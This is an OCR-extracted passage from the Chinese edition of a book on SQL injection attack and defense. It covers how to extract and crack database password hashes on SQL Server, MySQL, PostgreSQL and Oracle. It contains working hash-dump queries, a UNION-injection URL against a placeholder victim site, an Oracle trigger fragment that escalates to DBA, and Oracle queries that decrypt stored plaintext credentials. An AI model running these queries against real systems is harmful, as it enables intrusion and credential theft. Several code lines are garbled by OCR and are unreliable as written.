请注意，当对SYSTEM.OLS表执行插入操作时，该触发器将被调用。SYSTEM.OLS表是
一个特殊的表，PUBLIC角色具有在该表上执行插入操作的权限。
现在，可以在该表上执行插入insert 操作，最终结果就是 SYSTEM.the_trigger触发器在
SYSTEM权限下被执行，它将DBA角色授予PUBLIC：
select dbms_xmlquery.newcontext (*declare PRAGMA AUToNOMOUS_TRANSACTION;
tenp woxg(, rpuo!.. (....iliauog gof....)
163
---
## Page 178
SQL注入攻击与防御（第2版）
4.9窃取哈希口令
我们在本章前面介绍恢复应用用户的口令这种成功的攻击时，曾简单讨论过哈希函数。本
节我们将再次讨论哈希技术，不过这次与数据库用户有关。在所有常见的数据库服务器技术中，
都是使用不可逆的哈希算法（马上会看到，不同的数据库服务器及版本会使用不同的算法）来存
健用户口令。读者可以猜到，这些哈希算法都存储在数据库表中。要想读取表中的内容，通常
需要以管理员权限执行查询。如果您的用户没有这样的权限，那么请回到权限提升部分以了解
具体的实现方法。
要想捕获哈希口令，可以尝试多种工具并通过暴力破解攻击来检索生成哈希值的原始口
令，这会使数据库哈希口令成为所有攻击中最常受攻击的目标：因为用户通常在不同的机器和
服务上使用相同的口令，获取所有用户的口令通常就可以充分保证在目标网络中进行相对容易
且快速的扩展。
4.9.1SQL Server
如果面对的是Microsoft SQL Server，那么根据版本的不同，情况会差别很大。但不管什么
情况，您都需要有管理员权限才能访问哈希口令表。真正开始检索它们时（更为重要的一当尝
试攻击它们以获取原始口令时），差异便开始显现。
对于 SQLServer 2000 来说，哈希口令存储在master数据库的 sysxlogins 表中。可通过下
列查询很容易地检索到它们：
SELECT name, password FROM master.dbo.sysxlogins
这些哈希是使用pwdencryptO函数生成的。该函数是个未公开的函数，负责产生加盐（salted）
哈希，其中 salt 是一个与当前时间有关的函数。下面是我在测试中使用的 SQL Server上的 sa 口
令的哈希：
0x0100E21F79764287D299F09FD4B7EC97139C7474CA1893815231E9165D257ACE
B815111F2AE98359F40F84F3CF4C
该哈希可被分为下面几个部分：
·0x0100：头
●E21F7976: salt
●4287D299F09FD4B7EC97139C7474CA1893815231：区分大小写的哈希
●E9165D257ACEB815111F2AE98359F40F84F3CF4C：不区分大小写的哈希
每个哈希都是使用用户口令生成的，salt 被作为 SHA1算法的输入.David Litchfield 对 SQL
Server 2000 的哈希生成进行过全面分析，可访间 www.nccgroup.com/Libraries/Document_Dowmloads/
Microsof_SQL_Server_Passwords_Cracking_the_password_hashes.sflb.ashx 来获取该文档。我们]
感兴趣的是：SQLServer 2000上的口令区分大小写，而这简化了破解工作。
可使用下列|工具米破解哈希：NGSSQLCrack(www.ngssecure.com/services/information-security-
software/ngs-sqlcrack.aspx)或 Cain&Abel(www.oxid.it/cain.html)。
开发SQL Server 2005时(以及后续的 SQL Server 2008)，Microsoft 在安全性上采取了一种
更积极的姿态。哈希口令的实现很清楚地表明了范式的迁移。sysxlogins表已经不存在，可通
164
---
## Page 179
第4章利用SQL注入
过使用下列查询来查询sql_logins视图以检索哈希口令：
SELECT password_hash FROM sys,sql_logins
下面是从SQLServer 2005提取的一个哈希示例：
0x01004086CEB6A15AB86D1CBDEA98DEB70D610D7FE59EDD2FEC65
该哈希对SQLServer 2000的旧式哈希做了修改：
·0x0100：头
●4086CEB6: salt
●A15AB86D1CBDEA98DEB70D610D7FE59EDD2FEC65：区分大小写的哈希
不难发现，Microsoft移除了旧的不区分大小写的哈希。这意味着暴力破解攻击必须尝试更
多候选口令才能成功。就工具而言，NGSSQLCrack和Cain&Abel仍然是这种攻击最好的助手。
检索哈希口令时，会受很多因素的影响，Web应用可能不会始终以良好的十六进制格式返
回哈希。建议使用fn_varbintohexstrO函数将哈希值显式地强制转换为十六进制字符串。例如：
http: / /wr, victim.com/products asp7id=1+union+select+master, dbo.
fn_varbintohexstr (password_hash) +from+sys.sq1_
Logins+where+name+=+*sa *
4.9.2MySQL
SELECT user, passvord FROM =ysql.user;
哈希口令是通过使用PASSWORDO函数计算的，具体算法取决于所安装的MySQL版本。
MySQL4.1之前的版本使用的是一种简单的16字符哈希：
mysql> select PAsswORD(*passvord′)
1password(′passvord′)
1 5d2e19393cc5ef67
1 ro× in set (0.00 sec)
从4.1版本开始，MySQL对PASSWORDO函数做了些修改，在双SHA1哈希的基础上生
成了一种更长的（也更安全）41字符哈希：
mysql> select PASSWORD(′password')
1password (*password′)
1 *2470C0C0 6DEE42FD1618BB99005ADCA2EC9D1E19 1
1 rov in set (0.00 sec)
请注意哈希开头的星号。事实表明：所有由MySQL（4.1及之后的版本)生成的哈希口令均
以星号开头。如果无意中碰到以星号开头的十六进制字符串且长度为41个字符，那么很可能
165
---
## Page 180
SQL注入攻击与防御（第2版）
周边就装有MySQL。
捕获到哈希口令后，可尝试使用John theRipper（www.openwall.com/john/)或Cain&Abel
(www.oxid.it)来恢复原始口令。如果提取的哈希来自MySQL4.1及之后的版本，就需要为John
   ,  
4.9.3 PostgreSQL
如果刚好具有administrative权限，就可以访问pg_shadow表，可以使用下面两个查询轻松
提取密码的哈希：
SELECT usename, passvd FROM p9_shadow
SELECT rolname, rolpassword FROM p9_authid
在PostgreSQL中，默认情况下使用MD5来对密码进行哈希处理，这使得暴力破解攻击非
常有效。但是请记住，在调用哈希函数之前，PostgreSQL会把password与usermame 连接起米。
另外，字符串“md5”将放在哈希值之前。也就是说，如果usermame是bar，密码是foo，那么
哈希后的结果将是：
HASH = *md5' 11 MD5(*foobar′) = md53858f62230ac3c915f300c664312c63f
读者可能想知道，为什么PostgreSQL需要将字符串“md5”放在哈希值之前？这样做的目
的，是为了说明该值是一个哈希值还是密码本身。当然你也许已经知道，PostgreSQL也允许以
明文方式来存储密码，比如下面的查询：
4.9.4Oracle
Oracle 在 sys.user$表的 password 列存储数据库账户的哈希口令。dba_users 视图指向该表，
但从Oracle 1lg 开始，数据加密标准(Data Encryption Standard，DES)的哈希口令不再出现在
dba_users 视图中。sys.userS表包含数据库用户(oype#=I)和数据库角色（oype#=0)的哈希口令。在
Oracle11g中，Oracle引入了一种新方法来计算其哈希口令（SHA1取代DES）并支持在口令中混
用大小写字符。旧式的DES哈希使用大写字母（不区分大小写）表示口令，这使得破解相对更容
易些。Oracle1lg中的新哈希虽然保存在相同的表中，但却位于不同的、名为 spare4的列中。默
认情况下，Oracle 11g将旧的(DES）和薪的(SHA1)哈希口令保存在同一表中，所以攻击者既可
以选择破解旧的哈希口令，也可以选择破解新的哈希口令。
可使用下列查询来提取哈希口令（以及它们所属的用户名）：
针对OracleDES用户名口令：
Select username,password from sys.userS where type#>0
andlength (password) =16
针对Oracle DES角色口令：
andlength (password) =16
针对 Oracle SHA1 口令(11g+):
166
---
## Page 181
第4章利用SQL注入
Select username, substr (spare4,3, 40) hash, substr (spare4, 43, 20) salt
fromsys.user$ where typei>0 and length (spare4)=62;
可使用多种工具(Checkpwd、Cain&Abel、John the Ripper、woraauthbf、GSAuditor 和 orabf)
来破解Oracle 口令。目前针对Oracle DES 口令的最快的工具是LaszloToth 的 woraauthbf;针
对SHA1 Oracle 哈希最快的是GSAuditor。请参考图 4-15列出的、通过 SQL 注入返回的 Oracle
哈希示例。
 x e e
FMPNOENAME
ALEXFA5CCIE
ANON1340US*
AQ_ADMNESTRATOR_ROLE*
AUTHENTICATEDUSER"
AQ_USER_ROLE-
CSW_UR_ROLE9DEAAA
CONNECT-
CTXSVSIE68TR36ADS6E5
AVXL
DATAPMP_EXT_RULL_DATABASE
CWM_USER·
DATAPUMOP_DO_FULL_DATABASE*
DELETE_CATALOG_ROLE*
DENIOI'
DEP*CE4A36B8E86CA59C
图 4-15Oracle 哈希示例
Oracle 数据库中的很多其他表（由Oracle 自己安装的）也包含哈希口令、加密口令，有时甚
至还包含明文口令。检索（明文）口令通常比破解要容易些。sysman.mgmt_credentials2表是通常
能找到的SYS用户明文口令的示例。在安装过程中，Oracle会询问安装人员是否希望为所有
SYSTEM的相同)保存在sysman.mgmt_credentials2表中。通过访间该表通常可以获取
SYS/SYSTEM 的口令。
下面是一些通常会返回明文口令的SQL语句：
-- during the installation time, looks like a hash but is a password)
select view_username, sysman, decrypt (view_password) Password from
sysman.mgmt_viev_user_credentials;
get the password of the dbsnmp user, databases listener and oS
select sysman.decrypt (t1,credential_value) sysmanuser, sysman.
 credentials
decrypt (t2.credential_value) Passvord
from sysman.mgmt_credentials2 t1, sysman.mgmt_credentials2 t2
where t1.credential_guid=t2.credentia1_guid
and Lower (t1 .credential_set_column) =′username*
and 1owez (t2.credential_set_column) =′password'
167
---
## Page 182
SQL注入攻击与防御（第2版）
-- get the username and passvord of the Oracle Knowledgebase Metalink
select sysman.decrypt (ARU_USERNAME) , sysman,decrypt (ARU_PASSWORD) from
SYSMAN.MGMT_ARU_CREDENTIALS ;
Oracle 组件
一些Oracle组件和产品要么附带有自己的用户管理（例如，Oracle Intermet Directory)，要么
将口令保存在其他表中（总共有100多张不同的表)。接下来将讨论在其他Oracle产品中有可能
会发现的一些哈希类型。
1) APEX
较新的 Oracle 数据库通常包含 Oracle Application Express（APEX)。Oracle 1lg 默认安装了
该组件（APEX3.0)。这个Web应用框架带有自己（轻量级）的用户管理功能。该产品的哈希口令
(2.2及之前的版本使用MD5，3.0及之后的版本使用 salted MD5)位于www_flow_fnd_user表的
FLOWS_xxyyzz模式（schema)中。不同版本的APEX使用不同的模式名，模式名中包含了APEX
的版本号（例如，APEX2.2的模式名为020200)：
select user_name, web_password_raw from flows_020000.wwv_flow_fnd_user;
select user_name, web_password_raw from flows_020100.wwv_flow_fnd_user
select user_name, web_password_raw from flows_020200.wwv_flow_fnd_user;
自APEX 3.0 以来，MD5 口令使用 security_group_id和 user_name 进行了加盐(salted)处理，
返回下列内容：
select user_name, web_passvord2, security_group_id from flows_030000,
wwv_flow_fnd_user;
select user_name, web_password2, security_group_id from flows_03o000,
wwv_flow_fnd_user;
2) Oracle Intemet Directory
OID(Oracle Internet Directory)Oracle 的) LDAP(Lightweight Directory Access Protocol, 
量级目录访问协议）目录，它自带了很多保存在多张表中的哈希口令。如果能正常访问公司中的
所有用户，就可以访问OID的哈希口令-出于兼容性方面的考虑，OID使用不同的哈希算法(MD4、
MD5和SHA1)来保存同一用户口令。
下列语句返回OID用户的哈希口令：
select a.attrvalue ssouser, substr (b.attrval,2,instr (b.attrval, *) ′) -2)
method,
rawtohex (ut1_encode.base64_decode (ut1_raw.cast_to_rav (substr
(b.attrval, instr (b , attrva1, */ *) +1))))hash
from ods.ct_cn a,ods.ds_attrstore b
where a,entryid=b,entryid
and lower (b.attrname) in (
*userpassvord', *orclprpassword*, *orclgupassword', .orclsslvalletpasswd*,
'authpassword′, *orclpassword′)
and substr (b,attrval, 2, instr (b,attrval, *) *) 2) ='xD4 *
order by method, ssouser;
select a.attrvalue ssouser, substr (b,attrval, 2, instr (b.attrval, *) *) -2)
method, ravtohex (utl_encode.base64_decode (utl_rav.cast_to_raw(substr
168
---
## Page 183